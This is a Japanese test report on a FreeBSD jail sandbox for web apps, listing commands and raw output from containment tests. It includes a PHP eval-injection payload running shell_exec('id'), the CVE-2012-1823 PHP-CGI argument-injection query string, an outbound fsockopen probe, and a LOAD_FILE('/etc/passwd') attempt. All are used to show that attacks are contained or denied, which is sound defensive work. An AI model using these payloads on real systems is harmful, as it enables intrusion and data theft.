# 実測 - 何を実行して、何が返って、何が弾かれたか

`README.md` の「実測したこと」の裏付け。実行したコマンドと、返ってきた出力の原文を残す。都合の悪い途中経過（試験側の不備で出た FAIL）も消さずに書く。証明になっていないものは、証明になっていないと書く。

## 環境

- ビルダー VM（box-builder）: UTM、x86_64 エミュレーション、メモリ 4GB、FreeBSD 15.1-RELEASE-p6
- 攻撃試験はすべてビルダー上で、FreeBSD の root で実行した
- 製品 VM（box-product）は生成イメージの起動確認用で、役割は §4

## 1. 中継の強制と封じ込め

メモアプリに意図的な `eval` の穴を開けた版を、段階0の通常経路（adapter → grant → dispatcher → スロットの php-cgi → 中継）に置いて攻撃する。  

駆動:

```
sh src/tests/attack/run.sh
```

攻撃リクエストは通常のメモ表示と同じ形で、`x` パラメータにPHP コードを入れる（`poc.sh`）:

```
GET /memos/22222222-2222-4222-8222-222222222222?x=<URL エンコードした PHP>
Cookie: box_session=stage0-demo-session
Sec-Fetch-User: ?1

x の中身: echo "PWNED\n"; echo shell_exec("/usr/bin/id");
          echo shell_exec("sysctl -n security.jail.jailed");
```

返ってきた出力（2026-10-28、現行ツリーでの再実行。抜粋ではなく判定部分の全文）:

```
== PoC
PWNED
uid=3001 gid=3001 groups=3001

== 1. 実行はスロットの中（uid はスロット用、jail の中）
PASS: uid はスロット用 (300x)
PASS: jail の中
== 2. 予算: 宣言は memo.get 1回。2回目は弾かれる
PASS: 1回目は通る
PASS: 2回目は通らない
== 3. 対象: 他のメモは宣言の外（forbidden）
PASS: 他の対象は forbidden
== 4. ネットワークは無い / ホストのファイルは見えない
PASS: 外向き接続はできない
PASS: ホストのファイルは読めない
PASS: 作業領域への書き込み自体はできる
== 5. 永続化しない: 次のリクエストでは消えている
PASS: 書いたファイルは次で消える
== 6. ホスト側: 攻撃に使われた世代が残っていない
PASS: 攻撃時の世代は全て片付いた

ALL PASS
```

判定の中身（verify.sh が個別に試したこと）:

- §2: 攻撃コードから中継の `memo.get` を2回呼ぶ。1回目は通り、
  2回目はエラーで返る（予算は宣言の1回）
- §3: 別の利用者のもの相当のメモ ID で `memo.get` を呼ぶと
  forbidden で返る
- §4: `fsockopen("203.0.113.1", 443)` は接続できない。ホストに
  置いた目印ファイル（`/tmp/box-attack-canary`）は読めない。
  作業領域（世代ごとの tmpfs）へ書くこと自体はできる
- §5: §4 で書いたファイルは、次のリクエストでは存在しない
- §6: 攻撃に使われたスロット世代は、強制片付けの期限の後に
  残っていない

初回（2026-10-27）は3件 FAIL が出たが、内訳はすべて試験側の
欠陥だった（`sysctl` の絶対パス指定漏れ、§6 の世代判定の
作り方）。直して再実行し、以後は ALL PASS が続いている。

## 2. CVE-2012-1823（パッチ前 PHP-CGI の引数注入）

パッチ前 PHP 5.3.11 をビルドし、CGI モードで古典的な引数注入を
発火させて、jail に閉じた場合の被害を見る。

```
sh src/tests/attack/cve-2012-1823-php-cgi/build-vuln-php.sh
sh src/tests/attack/cve-2012-1823-php-cgi/run-cgi.sh
```

発火の形: クエリ `?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp%3A%2F%2Finput`
に、POST 本文として PHP コードを送る。CGI/1.1 では「= を含まない
クエリ」は Web サーバーが argv として CGI に渡す（indexed query）
ため、再現にはその argv への変換まで含めた。env の
`QUERY_STRING` に書くだけでは発火しなかった（実測）。

攻撃コードが試すこと: `id` の実行、`security.jail.jailed` の確認、
外向き接続、ホストの目印ファイルの読み、`/work` への書き込み。

返ってきた出力（2026-10-28、全項目が実質を伴った再実行）:

```
== PoC 実行（CGI モード、jail の中）
  X-Powered-By: PHP/5.3.11
  Content-type: text/html

  PWNED
  uid=3001
  jailed=1
  net=blocked
  canary=unreadable
  wrote=/work/pwned.txt
  APP-RAN
PASS: コードが実行される（前提の再現）
PASS: uid はスロット相当 (3001)
PASS: jail の中
PASS: 外向き接続はできない
PASS: ホストのファイルは読めない
PASS: その後アプリ本体も走る
== 永続化しない: jail を作り直すと消えている
PASS: 書いたファイルは消えている

ALL PASS
```

位置づけの正直な注記: この試験が見たのは「素の jail に閉じた
場合の封じ込め」であって、箱の中継や予算の仕組みではない。
「箱の通常経路（FastCGI）ではこの発火点に届かない」は設計側の
主張で、この試験とは別に、経路の形から言えることとして分けて
ある。

途中の FAIL の内訳（すべて fixture 側の欠陥で、直して再実行した）:

- base.txz に `/usr/local` が無く、バイナリの配置で落ちた
- `jexec -u` はユーザーをホスト側で名前として引くため、
  数値 uid では実行ユーザーを指定できなかった
- 発火に argv の再現が要ることに気づくまで、アプリは走るが
  発火しない状態だった
- `/work` が素のディレクトリだと jail の作り直しで消えず、
  永続化の判定にならなかった（tmpfs に変えた）

## 3. WordPress のデータ層

MySQL 8.4.11 をネットワーク無しの jail（wpdb）で動かし、
WordPress 7.1.3 を設置して検証データを仕込んだ上で、公開側の
アカウント `wp_pub`（ビューのスキーマの SELECT のみ）で接続した。

DB の締め付け（`SHOW VARIABLES` の実測）:

```
skip_networking = ON（待ち受けポートは 0、socket のみ）
local_infile    = OFF
secure_file_priv = NULL（ファイルの読み書き操作は全面無効）
```

見えたもの（2026-10-28）:

```
-- wp_pub.wp_posts（ID, post_status）
1  publish  Hello world!
2  publish  Sample Page
4  publish  公開テスト記事
-- 下書き（ID 5）、非公開（6）、パスワード付き（7）は行ごと無い

-- wp_pub.wp_users（user_login, LENGTH(user_pass), LENGTH(user_email)）
siteadmin  0  0
author1    0  0
-- 記事を書かない会員（member1）は行ごと無い

-- wp_pub.wp_comments（comment_ID, approved, email/IP/agent の長さ）
1  1  0 0 0
2  1  0 0 0
-- 未承認（3）とスパム（4）は行ごと無い
```

弾かれ方（原文）:

```
mysql> INSERT INTO wp_pub.wp_posts (post_title) VALUES ('x');
ERROR 1142 (42000): INSERT command denied to user 'wp_pub'@'localhost' for table 'wp_posts'

mysql> SELECT COUNT(*) FROM wp.wp_posts;
ERROR 1142 (42000): SELECT command denied to user 'wp_pub'@'localhost' for table 'wp_posts'

mysql> SELECT LOAD_FILE('/etc/passwd') IS NULL;
1（= NULL が返る。読めていない）
```

UPDATE・DELETE・CREATE も同じ権限（SELECT のみ）で、同種の
denied になる。ビューと権限の DDL は
`src/wordpress/wp-pub-views.sql` に置いてある。

## 4. 製品イメージ（機能の確認だけ）

生成した qcow2 を別 VM で起動し、段階0の自動起動とメモ一覧の
応答を確認した（2026-10-28）。実行したのは Mac から SSH 越しの
1行:

```
ssh box@192.168.64.5 "printf 'GET /memos HTTP/1.0\r\nCookie: box_session=stage0-demo-session\r\nSec-Fetch-User: ?1\r\n\r\n' | nc localhost 8080"
→ HTTP/1.1 200 OK、シードのメモ2件の一覧 HTML
```

これは「動くこと」の確認であって、「安全なこと」の証明では
ない。安全の判定は §1〜§3 の、ビルダー側の結果をもって行う。

## 5. まだ証明になっていないこと

- **React2Shell（CVE-2025-55182）**: 脆弱な Next.js の受け側は
  jail 内で起動・応答するところまで構築済み。ただし発火ペイ
  ロード（公開 PoC の差し込み）が未投入で、判定は
  **POC-NO-FIRE**（=発火していない、であって「防げた」ではない）。
  発火の確認は見送り中（2026-10-28 に判断）
- **段階0の簡略化の範囲**: 中継の DB はインメモリのスタブ、
  認証は固定セッション、adapter はエッジとゲートウェイの一体化、
  jail は ap と relay のみ、pf 未適用、egress・管理・認証の
  jail は未実装。この範囲を超える保証は、まだ実測していない
- **WordPress の描画側**: データ層（§3）は通ったが、wp-pub
  スロットで実物の WordPress を描画する確認はこれから
